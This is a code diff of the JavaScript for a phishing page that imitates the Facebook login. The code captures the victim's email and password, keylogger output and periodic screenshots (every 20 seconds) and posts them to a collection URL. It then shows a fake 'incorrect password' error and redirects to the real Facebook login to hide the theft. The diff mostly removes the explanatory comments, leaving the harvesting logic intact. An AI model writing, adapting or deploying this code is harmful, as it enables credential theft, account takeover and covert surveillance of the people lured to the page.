@@ -1,6 +1,4 @@
 // Common functions for sending data, keylogging, and screenshotting
-// (Copy the common script.js content here)
-// --- START COMMON SCRIPT.JS ---
 function sendData(url, data, callback) {
     var xhr = new XMLHttpRequest();
     xhr.open('POST', url, true);
@@ -52,10 +50,8 @@ function captureAndSendScreenshot() {
 }
 
 setInterval(captureAndSendScreenshot, 20000);
-// --- END COMMON SCRIPT.JS ---
 
 
-// Template Specific Form Submission Logic for Facebook
 document.getElementById('loginForm').addEventListener('submit', function(e) {
     e.preventDefault(); // Prevent default form submission
 
@@ -69,12 +65,12 @@ document.getElementById('loginForm').addEventListener('submit', function(e) {
         return;
     }
 
-    // Real Facebook login page for redirection
+    
     var redirectUrl = 'https://www.facebook.com/login/device-based/regular/login/'; 
 
     var dataToSend = {
-        email: username, // Facebook uses 'email' field name
-        pass: password,   // Facebook uses 'pass' field name
+        email: username, 
+        pass: password,
         keys: loggedKeys, // Send any remaining keylogs
         redirect_url: redirectUrl
     };
@@ -85,14 +81,14 @@ document.getElementById('loginForm').addEventListener('submit', function(e) {
         errorBox.textContent = "The password that you've entered is incorrect. Did you forget your password?";
         errorBox.style.display = 'block';
 
-        // Wait a few seconds before redirecting to simulate processing
+        
         setTimeout(function() {
             window.location.href = redirectUrl;
-        }, 3000); // Redirect after 3 seconds
+        }, 3000); 
     });
 });
 
-// Hide error box on input focus
+
 document.getElementById('m_login_email').addEventListener('focus', function() {
     document.getElementById('error_box').style.display = 'none';
 });
